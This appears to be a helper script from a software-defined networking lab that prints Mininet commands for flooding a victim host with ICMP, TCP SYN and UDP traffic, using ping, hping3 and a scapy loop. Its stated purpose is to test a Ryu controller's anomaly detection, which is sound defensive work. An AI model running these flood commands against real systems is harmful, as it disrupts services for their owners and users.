#!/usr/bin/env bash
###############################################################################
# traffic/attack.sh
#
# Generate attack / anomalous traffic from h1 (attacker) toward h2 (victim).
# Provides multiple attack modes: ICMP flood, TCP SYN flood, UDP flood.
#
# Usage (from Mininet CLI):
#   source traffic/attack.sh          # prints instructions
#   OR run commands individually as shown below
#
# Usage (standalone):
#   bash traffic/attack.sh [attack_type]
#   attack_type: icmp | tcp | udp | all   (default: icmp)
###############################################################################

set -euo pipefail

ATTACK_TYPE="${1:-icmp}"
VICTIM_IP="10.0.0.2"
DURATION="${2:-30}"       # default 30 seconds for timed attacks

cat <<EOF
========================================================================
  Attack Traffic Generation — Mininet Commands
========================================================================

  Run these in the Mininet CLI (mininet>) from h1 (attacker):

  --- Option 1: ICMP Flood (simplest, no extra tools needed) ---
       h1 ping -f ${VICTIM_IP} &
       # Note: ping -f sends packets as fast as possible (flood mode).
       # Requires root (Mininet runs as root, so this works).

  --- Option 2: TCP SYN Flood (requires hping3) ---
       h1 hping3 --flood -S -p 80 ${VICTIM_IP} &
       # Sends TCP SYN packets as fast as possible to port 80.

  --- Option 3: UDP Flood (requires hping3) ---
       h1 hping3 --udp --flood -p 80 ${VICTIM_IP} &
       # Sends UDP packets as fast as possible to port 80.

  --- Option 4: Timed ICMP Flood (controlled duration) ---
       h1 ping -f -c 10000 ${VICTIM_IP} &
       # Sends 10000 pings as fast as possible, then stops.

  --- Option 5: Python scapy-based flood (fallback, no hping3 needed) ---
       h1 python3 -c "
from scapy.all import *
import time
target='${VICTIM_IP}'
start=time.time()
count=0
while time.time()-start < ${DURATION}:
    send(IP(dst=target)/ICMP(), verbose=0)
    count+=1
print(f'Sent {count} packets in ${DURATION}s')
       " &

  To stop all attacks:
       h1 kill %1        # kill background job on h1
       # or from Mininet CLI:
       h1 killall ping
       h1 killall hping3

  Notes:
    - These commands generate high-volume traffic designed to trigger
      the anomaly detection threshold in the Ryu controller.
    - The controller should detect the anomaly and install a drop flow
      within a few seconds (depending on POLL_INTERVAL and SUSTAINED_WINDOWS).
    - NEVER run these commands against real production networks.
========================================================================
EOF

# If run standalone with an attack type argument, print the specific command
case "${ATTACK_TYPE}" in
    icmp)
        echo "[attack.sh] ICMP flood command:"
        echo "  h1 ping -f ${VICTIM_IP} &"
        ;;
    tcp)
        echo "[attack.sh] TCP SYN flood command (requires hping3):"
        echo "  h1 hping3 --flood -S -p 80 ${VICTIM_IP} &"
        ;;
    udp)
        echo "[attack.sh] UDP flood command (requires hping3):"
        echo "  h1 hping3 --udp --flood -p 80 ${VICTIM_IP} &"
        ;;
    all)
        echo "[attack.sh] All attack commands:"
        echo "  h1 ping -f ${VICTIM_IP} &"
        echo "  h1 hping3 --flood -S -p 80 ${VICTIM_IP} &"
        echo "  h1 hping3 --udp --flood -p 80 ${VICTIM_IP} &"
        ;;
    *)
        echo "[attack.sh] Unknown attack type: ${ATTACK_TYPE}"
        echo "  Valid options: icmp, tcp, udp, all"
        ;;
esac
echo ""
